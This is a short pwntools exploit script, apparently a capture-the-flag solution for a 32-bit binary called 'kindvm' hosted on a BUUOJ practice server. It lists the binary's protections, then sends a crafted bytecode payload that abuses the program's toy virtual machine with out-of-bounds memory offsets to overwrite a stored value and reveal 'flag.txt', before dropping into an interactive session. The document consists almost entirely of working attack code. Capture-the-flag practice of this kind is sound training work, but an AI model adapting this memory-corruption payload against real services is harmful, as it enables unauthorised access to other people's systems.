'''
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)

1. reverse the vm opcodes
2. input the vm payload to get the shell
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 26018 
filename = "./kindvm"
elf = ELF(filename)
context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    '''
        load reg1, [mem-40] # 1, 1, 0xFFD8
        store [mem-36], reg1 # 2, 0xFFDC, 1
        halt # 6
    '''
    payload = b'\x01\x01\xFF\xD8'
    payload += b'\x02\xFF\xDC\x01'
    payload += b'\x06'
    io.sendlineafter(b'name : ', b'flag.txt')
    io.sendlineafter(b"instruction : ", payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
